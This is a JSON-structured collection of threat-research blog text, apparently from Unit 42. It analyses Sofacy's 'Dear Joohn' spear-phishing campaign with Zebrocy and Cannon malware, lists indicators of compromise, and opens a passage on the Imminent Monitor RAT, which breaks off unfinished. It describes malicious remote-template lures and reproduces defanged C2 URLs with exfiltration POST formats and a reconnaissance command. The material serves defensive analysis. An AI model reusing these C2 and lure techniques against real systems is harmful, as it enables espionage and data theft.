                "By leveraging our AutoFocus threat intelligence platform in conjunction with data collected from VirusTotal, we were able to pivot from artifacts discovered in the metadata and behaviors to discover the Cannon tool, as well as a number of additional delivery documents, payloads, and targets.",
                "The attack vector for all of these attacks appears to be via spear-phishing, using email accounts registered to legitimate email providers instead of spoofed email addresses or previously compromised accounts.",
                "The account names visually look similar to legitimate government organization names or other trusted third-party entities.",
                "The delivery documents were functionally all the similar, using the remote template function in Microsoft Word to retrieve a malicious macro from the first stage C2 and ultimately loading and executing an initial payload.",
                "The majority of delivery documents contain a generic lure image requesting the victim enable macros with no additional content, the adversaries seemingly relying solely on lure filenames to entice victims to launch the malicious document."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In all, we intercepted nine weaponized documents spanning from October 17, 2018 through November 15, 2018 all sharing the same Joohn author name and delivering variants of either Zebrocy or Cannon.",
                "The target radius of our dataset spans four continents, covering government agencies at the federal level all the way to local government agencies.",
                "We also conducted timeline analysis using the collected data which allowed us to discover how the Sofacy group timed their attacks in the Dear Joohn campaign and also how they may have crafted their attacks using automated tools."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Attack Details"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Beginning on October 17, 2018, we collected a total of nine delivery documents sent to a multitude of organizations around the world.",
                "The targets included a foreign affairs organization in North America, foreign affairs organizations in Europe, as well as government entities in former USSR states.",
                "We also discovered evidence of possible targeting of local law enforcement agencies around the world, covering North America, Australia, and Europe.",
                "Our telemetry also showed possible targeting of NGOs, marketing firms, as well as organizations in the medical industry.",
                "The attack vector of these attacks was all via spear-phishing, using email accounts registered to the free email provider Seznam, a popular web services provider located in the Czech Republic.",
                "An example can be seen in Figure 1."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Example spear-phishing email delivered in Dear Joohn attacks"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this campaign, the Sofacy group appears to have relied heavily on filenames to lure victims into launching the weaponized documents.",
                "Filenames ranged from topics alluding to Brexit, the Lion Air crash, and recent rocket attacks in Israel.",
                "The full list of filenames we were able to collect can be seen in Table 1.",
                "Although the filenames appeared to be highly targeted and pertinent to the victims, the actual lure content of the documents were far more generic as seen in Figure 2."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Generic lure image"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In November 2018, the adversary shifted tactics and began implementing non-generic lure content for their weaponized documents.",
                "We collected three samples heavily targeting NATO-aligned nation states at this time, using three different lures as seen in Figure 3."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Targeted lure content"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In one of the documents, the victim is presented with what appears to be an obfuscated document with the NATO EOD seal and text alluding to the targeted nation state.",
                "Unpacking the document revealed that the unobfuscated image was a screenshot of a cover page regarding a NATO workshop in the targeted nation state.",
                "The other two documents had very similar lures to each other, presenting garbled text to the target with instructions for the victim on how to properly view the document.",
                "Interestingly, one of them contained instructions in Russian, which may indicate the intended target was a Russian speaking nation-state."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Each of these weaponized documents used the same tactic for their attacks.",
                "Upon opening the document, it leveraged the ability of Microsoft Word to retrieve a remote template to then load a malicious macro document as seen in Figure 4."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Microsoft Word attempting to download the remote template"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the C2 server is active at the time the document is opened, it will successfully retrieve the malicious macro and load it in the same Microsoft Word session.",
                "The victim will then see a prompt to Enable Content as with any malicious macro document as seen in Figure 5.",
                "If the C2 server is not active at this time, the download will fail and the victim will not receive a prompt to Enable Content as no macro is downloaded."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 Remote template document requesting the user to click \"Enable Content\" to run macro"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Clustering"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The delivery documents used in the October and November waves shared a large number of similarities, as seen in Table 1, which allowed us to cluster the activity together.",
                "Most notably, the author nameJoohn wasused repeatedly in each delivery document.",
                "There was a slight deviation in the November grouping, where the three samples we collected still used the Joohn author name for the last modified field but reverted to a default USER/user author name for the creator field."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 Delivery documents seen in the Dear Joohn attack campaign"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The remote template documents retrieved bythe delivery documents in Table 1 also shared a common author name, using the stringxxx.",
                "Table 2 shows the remote templates downloaded by delivery documents in this attack campaign.",
                "In the tables and text of this report, we are referring to samples by a shortened version of their SHA256 hash to improve readability.",
                "The full hashes and metadata are available in CSV format here."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2 Remote templates downloaded by Dear Joohn delivery documents"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As seen in Table 1, the delivery documents accessed their respective remote templates from four C2 servers at the following IP addresses:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These initial C2 IP addresses not only hosted the remote templates that subsequently load the first-stage Zebrocy or Cannon payloads, but the IP addresses also hosted the C2 server for the first-stage payloads themselves.",
                "All C2s used in the Dear Joohn campaign were IP-based and examining the infrastructure did not provide significantoverlap or relationships with previousZebrocyorSofacyinfrastructure.",
                "A visual representation of the Dear Joohn campaign can be seen in Figure 6."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure\u00a06 Relational diagram of artifacts"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We created a timeline of the activity based off the data we collected, and found that the attack dates were tightly clustered into two waves in mid- to late-October and in mid-November as we see in Figure 7 using the timestamps from Table 3."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 3 Timestamps of delivery documents (all times in UTC)"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7 Dear Joohn timeline"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Based off the timestamps we have, four delivery documents were initially created on September 11, 2018 04:22 UTC.",
                "These four were then all modified on the same date and time on October 13, 2018 08:21.",
                "Having three different C2 locations embedded inside these delivery documents while maintaining the exact same timestamping may indicate the use of an automated tool.",
                "Using a command line based penetration testing toolkit such as Phishery could allow for simple scripting to generate multiple documents all at the same time with different inputs.",
                "From there, there was an average of a two-week gap until these documents were first seen in the wild.",
                "In total, these four documents had an average of roughly 46 days from initial creation to attack.",
                "Based on the modular nature of the Dear Joohn campaign attacks, the lengthy amount of time from initial creation to attack may suggest the campaign was not yet ready for deployment due to additional development required for the remote templates, payloads, or infrastructure.",
                "Another possible scenario is that the adversary may have had a certain timeframe they desired to execute the attack, and from the timeline it is clear there were two distinct targeting time frames, one from mid to late October 2018 and the other in mid-November 2018.",
                "As the campaign progressed, the operational tempo of the Dear Joohn campaign increased, with the total time from document creation to first seen dropping down to an average of roughly two days."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When comparing the provided timestamps of the delivery documents to the timestamps for the remote template documents from Table 2, we find that the time to attack is directly correlated to the last time the templates are modified.",
                "On average, there was a 13.8 hour gap between when the template document was last touched by the operator and when the delivery document is first observed in the wild.",
                "This leads us to believe that the generation of the delivery documents were indeed part of a staging effort, first with the initial creation of the document, modification to it to communicate with a C2, then generating a remote template document just prior to launching the actual attack."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Analysis using timestamps is not always conclusive however.",
                "One of the documents we examined with the filename Rocket attacks on Israel.docx (SHA256: 34bdb5b364..) contained inconsistent creation and last modified timestamps, with the last modified timestamp occurring before the creation timestamp.",
                "A possible explanation for this is that the document was copied to another system with an incorrectly set system time, then saved with the incorrect time.",
                "This document was also the first of the mid-November cluster which used the user/USER author name instead of Joohn, further supporting the scenario of the document being copied between systems."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Payloads"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The delivery documents in this attack campaign loaded remote templates whose macros installed a variety of first-stage payloads.",
                "With the notable exception of the Cannon tool, the first-stage tools are all variants of the Zebrocy Trojan.",
                "The Zebrocy variants delivered in this campaign were written in several different languages, including Delphi, C# and VB.NET.",
                "Information on the first-stage payloads delivered in this attack are listed in Table 4."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 4 Payloads delivered in related attacks"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Delphi variant of Zebrocy delivered in this attack campaign are very similar to the Delphi downloader discussed in our previous Zebrocy research published in June 2018.",
                "While this Delphi variant was known, the C# and VB.NET variants delivered in this attack campaign were previously unknown.",
                "An interesting note on these payloads is that all the Delphi payloads delivered in this campaign were packed with UPX, while none of the other payloads were packed.",
                "While we can only speculate on the specific reason, it is likely Sofacy packed only the Delphi variants in an attempt to increase evasion as the Delphi variant of Zebrocy is known and has been widely analyzed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "By collecting and analyzing additional Cannon samples, we believe we have also found a Cannon variant written in Delphi.",
                "We have seen Sofacy using multiple languages to create variants of the Zebrocy Trojan, so it seems fitting that the group would create additional variants of Cannon in multiple programming languages as well."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C# Cannon"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Since our initial blog that introduced the Cannon tool, we were able to collect more samples of Cannon to get a better understanding of its origins.",
                "It appears that the first known sample of Cannon was created on April 18, 2018 and since then there has been at least seven additional samples.",
                "Table 5 shows the known Cannon samples, their compilation time and the email accounts used for its C2 communications."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 5 Gathered C# Cannon samples"
            ]
        },
        {
            "type": "caption",
            "content": [
                "As mentioned in our initial blog, the actor controlled email address acting as the C2 was sahro.bella7[at]post.cz, but all previous samples of Cannon used sym777.g[at]post.cz.",
                "Also, all previous samples of Cannon used an account name of kae.mezhnosh to receive emails from the actor, while using the accounts vebek.morozh30, g0r7tsa45s and marvel.polezha to send emails to the actor."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As we reported in our previous analysis of Cannon, the tool logs into an email account using POP3S and checks for emails with a specific filename that it will save to the system and execute.",
                "The initial sample we analyzed looked for an attachment with a filename of auddevc.txt, but other Cannon samples have looked for the following filenames instead:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Delphi Cannon"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While searching for additional Cannon samples, we discovered another tool that used emails for its C2 communications.",
                "The initial overlap was based on the filename wmssl.exe, which was seen as an executable name that Cannon would move the wmssl.txt attachment to install and execute a secondary payload.",
                "Initial analysis indicated this may have been a tenuous connection; however, after we gathered additional samples of Delphi Cannon, we discovered additional relationships.",
                "Table 6 shows Delphi Cannon samples we gathered, including the sample 215f7c08c2.. that is very similar to the Trojan discussed in ESETs research."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 6 Gathered Delphi Cannon Samples"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The compilation times in Table 6 suggests that the Delphi variant of Cannon predates the originally reported version, as the first known Delphi sample was compiled in January 2018 and the first known Cannon sample was compiled in April 2018.",
                "The Delphi variant of Cannon does not use legitimate web-based email services for its C2 communications, instead opting to use email accounts at an actor owned domain, ambcomission[.]com.",
                "This actor controlled domain links to a larger Sofacy infrastructure as reported by ThreatConnect.",
                "Even though Delphi Cannon uses POP3S and SMTPS for its C2 communications like Cannon, it is arguably easier to defend against as it uses an actor owned domain that defenders can easily block and not a legitimate email provider such as Seznam."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The oldest known sample of the Delphi variant (SHA256: 5a02d4e5f6) provided us a much stronger linkage between this Delphi Cannon and Cannon, as this sample collects system information and sends it to the C2 email address, which includes the path of the running process appended to the string Running place.",
                "The screenshot in Figure 8 of the inf method within a Cannon sample (SHA256: 4405cfbf28...) shows the information gathered that is exfiltrated to the C2 via email, specifically with RunningPlace and LogicalDrives header strings:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8 inf method used by Cannon"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When comparing the two Cannon variants, we found a method within a Delphi Cannon sample (SHA256: 5a02d4e5f6...) showing the use of Running place and Logical_Drivers as header strings to the system information it is collecting and sending to the C2 via email.",
                "While not an exact match, Figure 9 shows these similar header strings and strengthens our hypothesis that the two variants are indeed related:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 9 Similarities of Delphi Cannon and Cannon"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As seen in Table 6, one of the Delphi Cannon samples (SHA256: cac630c11c..) does not have any associated email addresses, as the sample does not seem to have any C2 functionality.",
                "Instead, this sample reads tasks from a file named ta.bin that another unknown tool then must write to and handle C2 functionality.",
                "It is also interesting that this specific sample has the same resource name (L30) that contains the same encrypted email addresses as the other samples in Table 6 using heatlth500@ambcomission[.]com as a C2 email (such as ecc5805898..) but does not contain any code to access the resource or decrypt its contents."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "VB.NET Zebrocy Variant"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The VB.NET variant (SHA256: e5aece694d..) is very similar to other known Zebrocy variants.",
                "It includes the storage volume serial number within the URL it uses as its C2 beacon, which it obtains using the Scripting.",
                "FileSystemObject object to call GetDriveName from the path stored in Environment.SpecialFolder.LocalApplicationData.",
                "It then uses the storage volume obtained from the GetDriveName function and calls GetDrive to get the SerialNumber of the storage device.",
                "The VB.NET variant then gathers system information and running processes like other Zebrocy variants by running the following commands:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "systeminfo & tasklist"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The URL used to send the system information, running processes and a screenshot to the C2 server is:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://109.248.148[.]42/agr-enum/progress-inform/cube.php?res=[serial number]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The VB.NET variant of Zebrocy uses an HTTP POST request to the URL above to transmit the gathered data, of which is included within the HTTP POST data that is structured as follows (notice the spaces before and after ampersand &):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "data=[system information and running processes] & arg=[screenshot in BMP format]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C# Zebrocy Variant"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C# variant of Zebrocy is similar to other variants in functionality, but also has several unique attributes that are worth discussing.",
                "Like other Zebrocy tools, the C# variant gathers the storage volume serial number to use in outbound beacons to the C2 server.",
                "In this particular variant, the tool uses the Windows API function GetVolumeInformation to get the serial number of the C: drive.",
                "This variant of Zebrocy also takes a screenshot that it will transmit to the C2 server in JPEG format."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The most notable change to this variant of Zebrocy, other than the programming language used, is the way the tool gathers the system information and running processes.",
                "Instead of using systeminfo and tasklist commands, the C# variant of Zebrocy uses WMI queries to gather this information.",
                "The tool runs the following list of WMI queries:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The URL used to send the system information, running processes and a screenshot to the C2 server is:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://145.249.105[.]165/resource-store/stockroom-center-service/check.php?fm=[serial number]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C# variant of Zebrocy uses an HTTP POST request to the URL above to transmit the gathered data, of which is included within the HTTP POST data that is structured as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "spp=[system information from WMI queries] &spvg=[screenshot in JPEG format]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Sofacy group continues their attacks on organizations across the globe using similar tactics and techniques.",
                "We observed them carrying out attacks via spear-phishing emails in late October through November, often leveraging current events within filenames to entice recipients to open the malicious attachments.",
                "The group clearly shows a preference for using a simple downloader like Zebrocy as first-stage payloads in these attacks.",
                "The group continues to develop new variations of Zebrocy by adding a VB.NET and C# version, and it appears that they also have used different variants of the Cannon tool in past attack campaigns."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected by attacks discussed in this blog by:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Indicators of Compromise"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Delivery Hashes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c20e5d56b35992fe74e92aebb09c40a9ec4f3d9b3c2a01efbe761fa7921dd97f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "abfc14f7f708f662046bfcad81a719c71a35a8dc5aa111407c2c93496e52db74"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "40318f3593bca859673827b88d65c5d2f0d80a76948be936a60bda67dff27be9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5749eb9d7b8afa278be24a4db66f122aeb323eaa73a9c9e52d77ac3952da5e7d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "af77e845f1b0a3ae32cb5cfa53ff22cc9dae883f05200e18ad8e10d7a8106392"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "34bdb5b364358a07f598da4d26b30bac37e139a7dc2b9914debb3a16311f3ded"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "79bd5f34867229176869572a027bd601bd8c0bc3f56d37443d403a6d1819a7e5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "77ff53211bd994293400cb3f93e3d3df6754d8d477cb76f52221704adebad83a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Remote Template Hashes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "86bb3b00bcd4878b081e4e4f126bba321b81a17e544d54377a0f590f95209e46"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2da5a388b891e42df4ed62cffbc167db2021e2441e6075d651ecc1d0ffd32ec8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0d7b945b9c912d205974f44e3742c696b5038c2120ed4775710ed6d51fbc58ef"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fc69fb278e12fc7f9c49a020eff9f84c58b71e680a9e18f78d4e6540693f557d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ed8f52cdfc5f4c4be95a6b2e935661e00b50324bee5fe8974599743ccfd8daba"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b9f3af84a69cd39e2e10a86207f8612dd2839873c5839af533ffbc45fc56f809"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Remote Template URLs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://188.241.58[.]170/live/owa/office.dotm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://185.203.118[.]198/documents/Note_template.dotm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://185.203.118[.]198/documents/Note_template.dotm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://145.249.105[.]165/doc/temp/release.dotm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://145.249.105[.]165/messages/content/message_template.dotm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://188.241.58[.]170/version/in/documents.dotm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://109.248.148[.]42/officeDocument/2006/relationships/templates.dotm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://109.248.148[.]42/office/thememl/2012/main/attachedTemplate.dotm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://109.248.148[.]42/office/thememl/2012/main/attachedTemplate.dotm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ZebrocyHashes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5173721f3054b92e6c0ff2a6a80e4741aa3639bc1906d8b615c3b014a7a1a8d7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "61a1f3b4fb4dbd2877c91e81db4b1af8395547eab199bf920e9dd11a1127221e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9a0f00469d67bdb60f542fabb42e8d3a90c214b82f021ac6719c7f30e69ff0b9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b41480d685a961ed033b932d9c363c2a08ad60af1d2b46d4f78b5469dc5d58e3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c91843a69dcf3fdad0dac1b2f0139d1bb072787a1cfcf7b6e34a96bc3c081d65"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e5aece694d740ebcb107921e890cccc5d7e8f42471f1c4ce108ecb5170ea1e92"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ZebrocyC2 URLs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://188.241.58[.]170/local/s3/filters.php"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://185.203.118[.]198/en_action_device/center_correct_customer/drivers-i7-x86.php"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://145.249.105[.]165/resource-store/stockroom-center-service/check.php"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://109.248.148[.]42/agr-enum/progress-inform/cube.php"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Cannon Hashes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "861b6bc1f9869017c48930af5848930dd037fb70fc506d8a7e43e1a0dbd1e8cb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4405cfbf28e0dfafa9ea292e494f385592383d2476a9c49d12596b8d22a63c47"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "174effcdeec0b84c67d7dc23351418f6fa4825550d595344214cc746f1a01c1a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a23261e2b693750a7009569df96ec4cf61e57acc9424c98d6fe1087ff8c659ce"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "651d5aab82e53711563ce074c047cbaa0703931673fa3ad20933d6a63c5c3b12"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "68df0f924ce79765573156eabffee3a7bb0fa972d2b67d12dd91dea3ec255d24"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "61a1f3b4fb4dbd2877c91e81db4b1af8395547eab199bf920e9dd11a1127221e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5a02d4e5f6d6a89ad41554295114506540f0876e7288464e4a70c9ba51d24f12"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d06be83a408f4796616b1c446e3637009d7691c131d121eb165c55bdd5ba50b4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "78adc8e5e4e86146317420fa3b2274c9805f6942c9973963467479cb1bbd4ead"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "054c5aa73d6b6d293170785a82453446429c0efc742df75979b760682ac3026b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cac630c11c4bf6363c067fbf7741eae0ec70238d9c5e60d41f3ed8f65b56c1d1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ecc5805898e037c2ef9bc52ea6c6e59b537984f84c3d680c8436c6a38bdecdf4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "215f7c08c2e3ef5835c7ebc9a329b04b8d5215773b7ebfc9fd755d93451ce1ae"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Cannon Related Emails"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sym777.g[at]post.cz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "kae.mezhnosh[at]post.cz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "vebek.morozh30[at]post.cz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "g0r7tsa45s[at]post.cz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "marvel.polezha[at]post.cz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sahro.bella7[at]post.cz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "trala.cosh2[at]post.cz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Bishtr.cam47[at]post.cz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Lobrek.chizh[at]post.cz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Cervot.woprov[at]post.cz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "heatlth500[at]ambcomission[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "trash023[at]ambcomission[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "trasler22[at]ambcomission[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "rishit333[at]ambcomission[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "tomasso25[at]ambcomission[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "kevin30[at]ambcomission[.]com"
            ]
        }
    ],
    "f17150e5287c0ef49df36391ba3ab928844ac831": [
        {
            "type": "paragraph",
            "content": [
                "The availability of commodity malware  malware offered for sale  empowers a large population of criminals, who make up for their lack of technical sophistication with an abundance of malicious intent."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Rather than looking just at the malware samples and functionality themselves, weve taken an interest in the commodity malware ecosystem; especially into the malware authors who fundamentally empower and profit from it."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Our previous research into commodity Remote Access Tools (RATs) has assisted law enforcement efforts in prosecuting the authors and customers of malware including Orcus, LuminosityLink and Adwind.",
                "Our SilverTerrier research into the immensely prevalent West-African financial cybercrime has shown the tremendous popularity of commodity malware empowering the largest financial cybercrime threat at this time, and especially their evolution towards using commodity RATs in their attacks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "One example is of the actors behind the Orcus RAT, which are the subject of recent and ongoing legal action in Canada.",
                "This case continues to be prosecuted with vigor.",
                "Palo Alto Networks has collected more than 16,000 distinct samples of Orcus RAT since April 2016 through to publishing, and we have observed more than 46,000 unique attacks using this RAT against Palo Alto Networks customers."
            ]
        },
        {
            "type": "caption",
            "content": [
                "We next focused on \u201cImminent Monitor,\u201d a RAT offered for sale since 2012.",
                "In comparison to Orcus RAT, we have more than 65,000 samples of Imminent Monitor, and observed its use in more than 115,000 unique attacks against Palo Alto Networks customers.",
                "This total number of samples includes those shared between antivirus vendors, not just those directly detected by Palo Alto Networks customers.",
                "However, the observed attacks figure only reflects actual, in-the-wild samples from Palo Alto Networks customers.",
                "In most cases, repeated attacks using the same samples and/or blocked by signature detection will not be reflected in this figure, and so the actual total number of attack attempts will be much higher than reflected in this metric.",
                "With such prevalence, we had to wonder why the author of this malware has been allowed to continue to profit from this for almost seven years, unchecked."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In order to evaluate the potential of success of legal action against a malware author, some of the first questions we ask are who are they, and where are they?",
                "This fundamental intelligence will drive the interest and ability of law enforcement to prosecute and inform researchers to which agency they might refer to this case.",
                "In the case of Imminent Monitor, Unit 42s referral and subsequent, ongoing cooperation helped initiate and drive international law enforcement action to proceed with charging those responsible for the development and management of this malware, their customers, and the disabling of access to their victims."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In 2012, a developer, Shockwave, registered the domain imminentmethods[.]info, and in April 2013 started selling his Imminent Monitor RAT on online forums and at his site, which later changed to imminentmethods[.]net.",
                "Earlier in 2012, he had offered a Distributed Denial of Service (DDoS) tool, ShockwaveBooter, but seemed to drop that project in favor of his new RAT."
            ]
        },
        {
            "type": "caption",
            "content": [
                "He proudly claimed \u201cthe fastest remote administration tool ever created using new socket technology that has never been used before.\u201d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1.",
                "Imminent Monitor 1.0 Client Control Panel"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The ImminentMonitor Client Control Panel offers a clean, easy-to-use interface to build (Figure 1) and control (Figure 2) ImminentMonitor client malware.",
                "As well as the full Remote Desktop access of any RAT, features less noticeable by the victim include:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Shockwave\u2122 claimed: \u201cWe use new methods not used in any rat, the remote desktop has the potential to get around 60 fps, and the cam I have personally gotten 130 with this.\u201d"
            ]
        },
        {
            "type": "caption",
            "content": [
                "In 2014, Imminent Monitor started supporting third-party plugins.",
                "The first of these offered the ability to turn the webcam light off while monitoring.",
                "Shockwave\u2122 wrote: \u201cHey, good job on being the first to release a plugin for Imminent Monitor.\u201d",
                "\u2013 a plugin with an obviously illegitimate intent."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2. Client control"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As very typical with commodity RATs, the authors attempt to profess innocence and distance themselves from the illegitimate features and intent of their malware:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "\u201cWe at Imminent Methods are not responsible for the nature in which you use our services.",
                "The services sold on this website are for personal, not distributed, use and should only be used on your own machines or the machines of those who have given you expressed consent for remote management.",
                "Remember that our tools are made for educational purpose, so we do not take any responsiblity for any damage caused by any of or tools or services.",
                "Misuse of our tools or services can be very illegal.",
                "Certain misuse could cause possible jail time or fines, which differ depending on your local laws.\u201d",
                "\u2026 \u201cYou agree that you will NOT distribute malicious files created with any of our services over the internet with the intent of harming/using machines of innocent people.",
                "You agree that if you do by some sort of means connect to a computer without authorization, by means of accident or other ways, that you will use the uninstall feature to completely remove the connection between the two of you and remove the software from their computer.\u201d",
                "[Sic]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "However, Shockwaves first-party comments online belie this claim:"
            ]
        },
        {
            "type": "caption",
            "content": [
